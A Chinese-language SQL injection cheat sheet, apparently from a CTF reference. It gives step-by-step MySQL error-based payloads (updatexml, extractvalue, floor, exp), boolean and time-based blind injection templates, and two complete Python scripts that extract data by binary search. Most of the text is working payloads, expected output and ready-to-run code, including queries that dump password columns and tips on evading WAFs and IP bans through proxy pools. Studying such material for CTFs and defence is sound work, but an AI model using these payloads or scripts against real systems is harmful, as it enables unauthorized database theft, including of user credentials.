## [g-error] 报错注入——有报错回显时，让报错信息"携带"查询结果
### [error-updatexml] updatexml 报错注入 | easy | updatexml;报错注入;XPATH | -
> UPDATEXML 解析 XPath 参数失败时会把参数内容带进报错信息，从而回显查询结果（MySQL 5.1.5+）。

#### 这个条目的作用
页面有报错回显（输入 `'` 会打印 SQL 错误）但没有数据回显（union 不显示结果）时，让报错信息把数据库内容"念"出来。它是报错注入三兄弟（updatexml / extractvalue / floor）里 payload 最短、最好记的一个。

#### 前置条件
| 条件 | 怎么确认 |
| --- | --- |
| 数据库是 MySQL 5.1.5 ~ 5.7 | 输入 `1'` 报错信息带 MySQL 字样，且 `AND updatexml(1,1,1)` 不报错 |
| 报错能显示在页面上 | 输入 `1'` 页面出现 SQL 语法错误文本 |
| 注入点可拼接、可注释 | 参考 basic-comment 的 `--+` / `#` |

#### 第 1 步：确认报错回显
在浏览器访问 `?id=1'`（字符型）或 `?id=1 AND 1=1`（数字型），页面出现类似：

```txt
You have an error in your SQL syntax; check the manual...
```

说明后端把错误直接输出到页面，报错注入有戏。如果错误被吞掉只显示 500，此路不通，直接转布尔盲注。

#### 第 2 步：验证 updatexml 函数可用
```sql
?id=1' AND updatexml(1,1,1) --+
```
预期：页面正常返回（`1` 是合法 XPath，函数正常执行，无报错）。如果这里就报错或异常，说明函数被禁用/版本过旧，换 error-extractvalue。

#### 第 3 步：让报错"念"出当前用户
```sql
?id=1' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) --+
```
预期页面出现：

```txt
XPATH syntax error: '~root@localhost~'
```

原理：`0x7e` 是 `~`，`~` 不是合法 XPath 字符，函数必然解析失败进入报错分支；而 MySQL 会把整个 concat 表达式的结果原样带进报错信息，于是 `SELECT user()` 的结果就"顺路"被打印出来了。

#### 第 4 步：读库表列数据
把第 3 步里的 `user()` 换成任意子查询。读当前数据库名：

```sql
?id=1' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+
```

读某张表的第一个表名（结果可能超长，先用 LIMIT 看一条）：

```sql
?id=1' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1) --+
```

#### 第 5 步：超过 32 字符的分段读取
报错信息只显示约 32 个字符，长字符串用 SUBSTR 切片，每 30 个字符一段：

```sql
?id=1' AND updatexml(1,concat(0x7e,substr((SELECT group_concat(password) FROM users),1,30),0x7e),1) --+
?id=1' AND updatexml(1,concat(0x7e,substr((SELECT group_concat(password) FROM users),31,30),0x7e),1) --+
```

SUBSTR 的起点每次 +30，直到某段返回空为止，把各段拼起来就是完整内容。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 第 2 步直接报错 | 版本过旧/函数被禁用 | 换 extractvalue 或 floor 报错 |
| 报错只显示 `~` 没内容 | 子查询返回多行或为空 | 子查询加 `LIMIT 0,1`；确认表名写对 |
| 报错内容被截断 | 32 字符硬上限 | 用 SUBSTR 分 30 字符一段 |
| 提交 `'` 后 404/被拦 | URL 未编码或被 WAF 拦 | 用 Burp 抓包发原始请求；`'` 编码为 `%27` |
| 页面正常不报错 | 后端关闭了错误显示 | 此路不通，转布尔/时间盲注 |

#### 实战要点
- 报错内容以 `~` 开头是 updatexml 的特征，一眼认出。
- 子查询必须用括号包成 `(SELECT ...)`，否则语法错误。
- 多行结果用 `GROUP_CONCAT` 压成一行，再配合 LIMIT/SUBSTR 取。
- 32 字符是硬上限，长数据分段是常态，不是报错。
- `--+` 在 URL 里等于 `-- `（`+` 被解码为空格），末尾记得闭合原语句。

### [error-extractvalue] extractvalue 报错注入 | easy | extractvalue;报错注入 | -
> EXTRACTVALUE 与 updatexml 同族同版本，XPath 表达式以 ~ 开头即报错并回显数据。

#### 这个条目的作用
updatexml 被过滤或不可用时的同款替代：extractvalue 原理完全相同，payload 结构几乎一致，一个被禁就换另一个，属于报错注入的"备用钥匙"。

#### 前置条件
- MySQL 5.1.5+，且页面有报错回显（同 error-updatexml 第 1 步）。
- 注入点可拼接、可注释。

#### 第 1 步：验证函数可用
```sql
?id=1' AND extractvalue(1,1) --+
```
预期：页面正常。若直接报错，说明函数不可用，回头用 updatexml。

#### 第 2 步：读当前用户
```sql
?id=1' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e)) --+
```
注意：extractvalue 只有两个参数，第二个参数放表达式，结尾没有第三个 `1`。
预期页面：

```txt
XPATH syntax error: '~root@localhost~'
```

#### 第 3 步：查表名（group_concat 一行带走）
```sql
?id=1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()))) --+
```
表多时结果会截断在 32 字符内，用第 4 步分段取全。

#### 第 4 步：长结果分段 + 取数据
```sql
?id=1' AND extractvalue(1,concat(0x7e,substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag'),1,30))) --+
?id=1' AND extractvalue(1,concat(0x7e,substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag'),31,30))) --+
```

#### 与 updatexml 对比
| 项目 | updatexml | extractvalue |
| --- | --- | --- |
| 参数个数 | 3 个 | 2 个 |
| 版本要求 | MySQL 5.1.5+ | MySQL 5.1.5+ |
| 报错信息 | XPATH syntax error | XPATH syntax error |
| 长度限制 | 约 32 字符 | 约 32 字符 |
| 触发写法 | `concat(0x7e,expr,0x7e)` | `concat(0x7e,expr)` |

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 报语法错误 | 照抄了 updatexml 的三参写法 | extractvalue 只有两个参数，去掉结尾的 `,1` |
| 报错被截断只出半截 | 32 字符上限 | SUBSTR 分 30 字符一段 |
| 函数被禁用 | 环境过滤函数名 | 换 floor 报错或布尔盲注 |
| 报错只显示 `~` | 子查询结果为空 | 加 `LIMIT 0,1`，核对表名/列名 |

#### 实战要点
- updatexml 和 extractvalue 本质同族：先试一个，被禁就换另一个，payload 只差参数个数。
- 结尾不需要第三个参数，别把 updatexml 的三参习惯带过来。
- 单行多结果优先 `GROUP_CONCAT`，配合 SUBSTR 分段取全。
- 报错注入都要求"报错上页面"，display_errors 关闭时全部失效。

### [error-floor] floor 报错注入 | medium | floor;rand;group by;count;exp | -
> 利用 COUNT+GROUP BY 对 FLOOR(RAND(0)*2) 分组时主键冲突，Duplicate entry 报错回显数据（MySQL 5.x）。

#### 这个条目的作用
updatexml / extractvalue 两个 XPath 函数都被过滤时的第三条路：靠 SQL 引擎自身的"主键重复"报错把数据带出来。payload 长、版本限制多，是报错注入的"最后备胎"。

#### 前置条件
- MySQL 5.x（5.0~5.7 可用）；MySQL 8.0 起报错不再携带数据，此路不通。
- 页面有报错回显。
- 语句长度限制够长（payload 超过 100 字符，短 URL 场景要转 POST）。

#### 第 1 步：理解报错从哪来
`COUNT(*) + GROUP BY` 会在内存建临时表做统计，`FLOOR(RAND(0)*2)` 每次求值结果都在变，导致同一行被分到不同组、临时表主键重复，MySQL 抛出 `Duplicate entry` 错误，而报错信息里带的正是 CONCAT 拼接进去的查询结果。

#### 第 2 步：基础 payload 读当前用户
```sql
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --+
```
预期页面：

```txt
Duplicate entry 'root@localhost1' for key '<group_key>'
```

（末尾的 `1` 是 FLOOR 的输出，`root@localhost` 是查询结果，它们被 CONCAT 拼在一起。）

#### 第 3 步：把 user() 换成任意查询
查当前库：

```sql
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --+
```

查表：

```sql
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --+
```

#### 第 4 步：exp 溢出变体
过滤了 floor / rand 时，用 EXP 大数溢出触发 `DOUBLE value is out of range` 报错：

```sql
?id=1' AND exp(~(SELECT * FROM (SELECT user())a)) --+
```

`~` 按位取反把数字变成超大值，`EXP(710)` 溢出报错，报错信息携带内层查询结果。

#### 第 5 步：长数据分段
报错同样有长度限制，配合 SUBSTR 分段：

```sql
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,30),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --+
```

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 报错信息里没有数据 | MySQL 8.0+ 已移除报错携带内容 | 换 union / 布尔盲注 |
| payload 超长被截断 | GET 参数长度限制 | 转 POST 提交，或拆成多次 |
| 页面偶发正常不报错 | RAND(0) 序列在数据量小时不保证必冲突 | 换 `FLOOR(RAND()*2)` 随机版，多试几次 |
| exp 报溢出但无数据 | 内层子查询写法不对 | 用 `(SELECT * FROM (SELECT user())a)` 双层结构 |

#### 实战要点
- 核心套路是 `COUNT(*) + GROUP BY + CONCAT(查询, FLOOR(RAND(0)*2))`，换内层子查询即可读任意数据。
- 只适用于 MySQL 5.x，先 `AND version()>0` 确认版本再投入时间。
- payload 长，优先用 Burp / 脚本提交，别手敲 URL。
- updatexml / extractvalue 全被禁时才轮到它，三兄弟从短到长依次试。

## [g-blind-bool] 布尔盲注——无回显但有真假差异，逐字符猜数据
### [blind-bool-basic] 布尔盲注判断模板 | easy | 布尔盲注;substr;ascii;if | -
> 页面在条件为真/假时返回不同内容，用 ASCII 逐字符二分猜出查询结果。

#### 这个条目的作用
页面既不显示查询结果、也不报错（union 和报错注入都失效），但条件为真/假时页面内容有差异——用"是/否"一个问题一个问题地问数据库，把数据逐字符问出来。这是布尔盲注的入门地基。

#### 前置条件
- 注入点已确认存在：`'` 引发异常，`AND 1=1` / `AND 1=2` 页面有差异。
- 能找到稳定的"真假特征"：真时页面上有某个固定字符串，假时没有。

#### 第 1 步：确认真假差异
```sql
?id=1 AND 1=1 --+    -- 真：正常页面
?id=1 AND 1=2 --+    -- 假：无数据/空页面/报错
```
两页必须有肉眼可见的差异（比如出现 / 不出现 `Welcome`），这是整个盲注的地基，差异不稳定后面全白搭。

#### 第 2 步：猜当前库的长度
```sql
?id=1 AND LENGTH(DATABASE())>3 --+   -- 真 → 库名至少 4 个字符
?id=1 AND LENGTH(DATABASE())=4 --+   -- 真 → 库名 4 个字符
```
先猜长度再猜内容，能省一半请求。

#### 第 3 步：猜第一个字符
```sql
?id=1 AND ASCII(SUBSTR(DATABASE(),1,1))>64 --+    -- 真 → ASCII 大于 64
?id=1 AND ASCII(SUBSTR(DATABASE(),1,1))<123 --+   -- 真 → ASCII 小于 123
?id=1 AND ASCII(SUBSTR(DATABASE(),1,1))=100 --+   -- 真 → 第一个字符是 'd'
```
把 `1,1` 换成 `2,1`、`3,1`……逐位推进。手测时先二分（`>64` → `>96` → `=100`）比从 0 到 127 逐个试快得多。

#### 第 4 步：IF 写法（等价模板）
部分过滤场景下用 IF 更稳：

```sql
?id=1 AND IF(ASCII(SUBSTR(DATABASE(),1,1))=100,1,0) --+
```

#### 第 5 步：完整手测一条数据（示例）
假设库名长度 4、四个字符 ASCII 依次为 100 / 116 / 102 / 123（即 `dtf{`）：

```txt
LENGTH(DATABASE())=4                 → 真
ASCII(SUBSTR(DATABASE(),1,1))=100    → 真 → 'd'
ASCII(SUBSTR(DATABASE(),2,1))=116    → 真 → 't'
ASCII(SUBSTR(DATABASE(),3,1))=102    → 真 → 'f'
ASCII(SUBSTR(DATABASE(),4,1))=123    → 真 → '{'
```

库名 = `dtf{`。手测完整 flag 太慢，确认模板能跑通后立刻上 blind-bool-script 的脚本。

#### 常用函数速查
| 函数 | 作用 |
| --- | --- |
| SUBSTR(str,pos,len) | 截取字符串，pos 从 1 开始 |
| ASCII() / ORD() | 取字符 ASCII 码 |
| MID(str,pos,len) | 同 SUBSTR，可互换 |
| LENGTH() | 字符串长度 |
| IF(cond,a,b) | 条件分支，可替代 AND 写法 |

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 两个条件页面没差异 | 特征选错或注入点不对 | 换特征字符串；先确认 `AND 1=1` / `AND 1=2` 有差异 |
| 真假结果随机变 | 页面上有时间戳/验证码等动态内容 | 选静态特征（固定文案、用户名） |
| 猜出的字符总错位 | 忘了 SUBSTR 的 pos 从 1 开始 | 第一个字符用 `,1,1` |
| 有差异但结果乱码 | 结果里有特殊字符 | 用 ASCII 数字比对，别直接比字符 |

#### 实战要点
- 真假特征要"稳定 + 静态"，脚本化前先手动各验证一次。
- 手测用二分（`>64` → `>96` → `=100`），别逐个试。
- 先猜长度再猜内容，请求量减半。
- 模板跑通立刻换脚本（blind-bool-script），手测只用于验证。

### [blind-bool-script] Python 二分脚本模板 | medium | python;二分;脚本;盲注 | -
> 手测太慢，用二分把逐字符猜测从 127 次降到 7 次，下面模板改两个地方即可用。

#### 这个条目的作用
把布尔盲注的"是/否"问答交给 Python：二分猜 ASCII 码，128 种可能只需约 7 次请求，自动拼出完整数据，是全自动拖库的基础。

#### 前置条件
- 已用 blind-bool-basic 手动验证真假差异存在。
- 本机有 Python 3 + requests 库（没有就 `pip install requests`）。

#### 第 1 步：保存脚本
```python
# -*- coding: utf-8 -*-
"""布尔盲注二分爆破脚本——直接保存运行，只改下面 4 个配置变量"""
import requests

# ===== 配置区（必改） =====
URL = "http://target/index.php"     # 目标地址
PARAM = "id"                        # 注入参数名
TRUE_MARK = "Welcome"               # 条件为真时页面必出现的特征字符串
PAYLOAD = "(SELECT DATABASE())"     # 要猜的表达式
# ========================

def cond(expr):
    """发送一个布尔条件，返回真假。expr 形如 ASCII(SUBSTR(...,1,1))>64"""
    r = requests.get(URL, params={PARAM: f"1 AND {expr} --+"}, timeout=10)
    return TRUE_MARK in r.text

def guess_int(expr, lo=0, hi=127):
    """二分猜一个整数（ASCII 码），约 7 次请求"""
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if cond(f"{expr}>{mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo

def get_str(expr):
    """先猜长度，再逐字符猜 ASCII，最后拼出完整字符串"""
    n = guess_int(f"LENGTH({expr})", 0, 100)
    print(f"[*] 长度: {n}")
    res = ""
    for i in range(1, n + 1):
        code = guess_int(f"ASCII(SUBSTR({expr},{i},1))")
        res += chr(code)
        print(f"[+] 第{i}字符: {chr(code)} ({code})  ->  {res}")
    return res

if __name__ == "__main__":
    print(get_str(PAYLOAD))
```

#### 第 2 步：改 4 个配置
| 变量 | 改成什么 | 例子 |
| --- | --- | --- |
| URL | 目标页面 | `http://10.0.0.1/sqli.php` |
| PARAM | 注入参数名 | `id` |
| TRUE_MARK | 你的真假特征 | 手动测 `AND 1=1` 时页面有的词 |
| PAYLOAD | 想猜的表达式 | `(SELECT database())` |

#### 第 3 步：跑起来
```bash
python bool_blind.py
```
预期输出：

```txt
[*] 长度: 4
[+] 第1字符: d (100)  ->  d
[+] 第2字符: t (116)  ->  dt
[+] 第3字符: f (102)  ->  dtf
[+] 第4字符: { (123)  ->  dtf{
```

#### 第 4 步：换 PAYLOAD 打库表列
```python
PAYLOAD = "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)"
PAYLOAD = "(SELECT column_name FROM information_schema.columns WHERE table_name='flag' LIMIT 0,1)"
PAYLOAD = "(SELECT flag FROM ctf.flag LIMIT 0,1)"
```
PAYLOAD 里的单引号会出现在 URL 中，requests 会自动做 URL 编码，无需手动处理。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 一直输出长度 0 | TRUE_MARK 选错或注入点不对 | 手动验证 `1 AND 1=1` 页面有该词、`1 AND 1=2` 没有 |
| 结果乱码 | 表达式写错或结果含非 ASCII 字符 | 打印 ASCII 码核对；检查括号是否配对 |
| 请求被限速/封 IP | 请求太快 | 循环里 `time.sleep(0.05)` 限速，或用代理池 |
| 二分卡死不动 | 网络超时导致误判 | requests 加 `timeout`，失败重试 3 次 |

#### 实战要点
- 二分模板 `(lo + hi + 1) // 2` 保证收敛，`lo == hi` 即答案。
- 先猜 `LENGTH` 再逐字符，总请求数 ≈ 长度 × 7 + 7。
- TRUE_MARK 宁短勿长、宁静态勿动态，选错整个脚本白跑。
- 打表数据时优先 `LIMIT 0,1` 逐条取，别一上来 GROUP_CONCAT 猜超长串。

## [g-blind-time] 时间盲注——连真假差异都没有时，用延迟当"真"的信号
### [blind-time-sleep] sleep 时间盲注 | easy | 时间盲注;sleep;if;benchmark | -
> 无任何回显时，让条件为真才延迟响应，用响应时间差读出数据。

#### 这个条目的作用
连真假页面差异都没有（完全无回显）时，把"真"的信号换成时间：条件为真就 `SLEEP(3)` 让响应慢 3 秒，用响应时间当"是/否"的答案。这是盲注的最后一层兜底。

#### 前置条件
- 注入点确认存在（字符型 / 数字型均可）。
- 网络稳定，目标正常响应时间已知（基线一般 <1 秒）。

#### 第 1 步：确认时间差可用
```sql
?id=1 AND SLEEP(3) --+
```
预期：页面约 3 秒后才返回。若瞬间返回，说明 SLEEP 被禁用或注入点没生效，先排查注入点。

#### 第 2 步：IF 模板——条件为真才睡
```sql
?id=1 AND IF(ASCII(SUBSTR(DATABASE(),1,1))>64,SLEEP(3),0) --+
```
读法：第一个字符 ASCII > 64 → 睡 3 秒（真）；否则立即返回（假）。观察响应时间即可回答"是/否"。

#### 第 3 步：等价写法
```sql
?id=1 AND SLEEP(IF(ASCII(SUBSTR(DATABASE(),1,1))=100,3,0)) --+
?id=1 AND ORD(MID(DATABASE(),1,1))=100 AND SLEEP(3) --+
```
第三种是"条件为真 AND SLEEP"，等价但注意前段必须为真才轮到 SLEEP 执行。

#### 第 4 步：完整 Python 时间盲注脚本
```python
# -*- coding: utf-8 -*-
"""时间盲注爆破脚本——直接保存运行，只改配置区"""
import requests
import time

# ===== 配置区（必改） =====
URL = "http://target/index.php"
PARAM = "id"
SLEEP_SEC = 3            # 延迟秒数，建议 3~5
THRESHOLD = 1.5          # 响应超过该秒数视为"真"
PAYLOAD = "(SELECT DATABASE())"
# ========================

def cond(expr):
    """条件为真返回 True：真 → SLEEP(3) 响应慢，假 → 立即返回"""
    sql = f"1 AND IF({expr},SLEEP({SLEEP_SEC}),0) --+"
    t0 = time.time()
    requests.get(URL, params={PARAM: sql}, timeout=SLEEP_SEC + 5)
    return time.time() - t0 > THRESHOLD

def guess_int(expr, lo=0, hi=127):
    """二分猜 ASCII 码，约 7 次请求"""
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if cond(f"{expr}>{mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo

def get_str(expr):
    """先猜长度，再逐字符猜 ASCII，拼出完整字符串"""
    n = guess_int(f"LENGTH({expr})", 0, 100)
    print(f"[*] 长度: {n}")
    res = ""
    for i in range(1, n + 1):
        code = guess_int(f"ASCII(SUBSTR({expr},{i},1))")
        res += chr(code)
        print(f"[+] 第{i}字符: {chr(code)} ({code})  ->  {res}")
    return res

if __name__ == "__main__":
    print(get_str(PAYLOAD))
```

#### 第 5 步：benchmark 变体（SLEEP 被过滤时）
```sql
?id=1 AND IF(1=1,BENCHMARK(10000000,SHA1('x')),0) --+
```
BENCHMARK 把 SHA1 循环 1000 万次制造 CPU 延迟。payload 长、耗时不可控，SLEEP 可用时优先 SLEEP。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 时间无差别（全真或全假） | SLEEP 被过滤 / 注入点无效 | 先裸测 `AND SLEEP(3)`；不行换 BENCHMARK 或换注入点 |
| 真假难分辨 | 网络抖动淹没 3 秒差距 | SLEEP 调到 5，THRESHOLD 调 2；多测几次取中位数 |
| 脚本跑一半断连 | 单个请求超过 timeout | requests 的 timeout 设为 `SLEEP_SEC + 5` |
| 误判"真" | 目标本身响应就慢 | 先测基线，THRESHOLD 设为基线的 2~3 倍 |

#### 实战要点
- 阈值公式：`SLEEP_SEC` 至少是正常响应时间的 5 倍，别用 1 秒这种模糊值。
- 时间盲注请求量巨大（长度 × 7 × 2 次往返），对目标影响明显，脚本里加 `time.sleep` 限速。
- 先手工确认一次时间差，再上脚本，别拿脚本当探测工具。
- 换数据库看 blind-time-db 对照表：PG 用 `pg_sleep`、MSSQL 用 `WAITFOR DELAY`。
